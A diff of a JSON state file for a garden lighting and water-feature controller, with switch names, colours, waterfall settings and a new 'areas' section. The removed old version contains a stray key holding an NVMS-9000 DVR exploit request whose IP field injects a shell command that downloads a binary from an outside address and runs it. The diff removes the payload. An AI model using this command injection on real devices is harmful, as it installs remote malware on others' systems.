@@ -1,46 +1,52 @@
 {
-    "switchNames": [
-        "firepit",
-        "path",
-        "pondOne",
-        "pondTwo",
-        "pondThree"
-    ],
-    "switches": {
-        "path": false,
-        "firepit": false,
-        "pondOne": false,
-        "pondTwo": false,
-        "pondThree": false,
-        "<?xml version=\"1.0\" encoding=\"utf-8\"?><request version=\"1.0\" systemType=\"NVMS-9000\" clientType=\"WEB\"><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type=\"filterTypeMode\">refuse</filterType><filterList type=\"list\"><itemType><addressType type=\"addressType\"/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(cd${IFS}/tmp;wget${IFS}http://107.174.137.24/garm7${IFS}-O-${IFS}>GSec;chmod${IFS}777${IFS}GSec;./GSec${IFS}tvt.rep;)</ip></item></filterList></content></request>": true
+  "switchNames": ["firepit", "path", "pondOne", "pondTwo", "pondThree"],
+  "switches": {
+    "path": false,
+    "firepit": false,
+    "pondOne": false,
+    "pondTwo": false,
+    "pondThree": false
+  },
+  "switchColors": {
+    "path": "#d41c1c",
+    "firepit": "#5972c0",
+    "pondOne": "#1430b8",
+    "pondTwo": "#c81e1e",
+    "pondThree": "#19b90e"
+  },
+  "waterfallNames": ["waterfallOne", "waterfallTwo", "waterfallThree"],
+  "waterfalls": {
+    "waterfallOne": false,
+    "waterfallTwo": false,
+    "waterfallThree": false
+  },
+  "waterfallHeaders": {
+    "waterfallOne": 17,
+    "waterfallTwo": 27,
+    "waterfallThree": 22
+  },
+  "waterfallIndex": {
+    "waterfallOne": 1,
+    "waterfallTwo": 2,
+    "waterfallThree": 3
+  },
+  "areas": {
+    "path": {
+      "ids": [1]
     },
-    "switchColors": {
-        "path": "#d41c1c",
-        "firepit": "#5972c0",
-        "pondOne": "#1430b8",
-        "pondTwo": "#c81e1e",
-        "pondThree": "#19b90e"
+    "firepit": {
+      "ids": [2]
     },
-    "waterfallNames": [
-        "waterfallOne",
-        "waterfallTwo",
-        "waterfallThree"
-    ],
-    "waterfalls": {
-        "waterfallOne": false,
-        "waterfallTwo": false,
-        "waterfallThree": false
+    "pondOne": {
+      "ids": []
     },
-    "waterfallHeaders": {
-        "waterfallOne": 17,
-        "waterfallTwo": 27,
-        "waterfallThree": 22
+    "pondTwo": {
+      "ids": []
     },
-    "waterfallIndex": {
-        "waterfallOne": 1,
-        "waterfallTwo": 2,
-        "waterfallThree": 3
-    },
-    "hardware": false,
-    "debug": false
+    "pondThree": {
+      "ids": []
+    }
+  },
+  "hardware": false,
+  "debug": false
 }
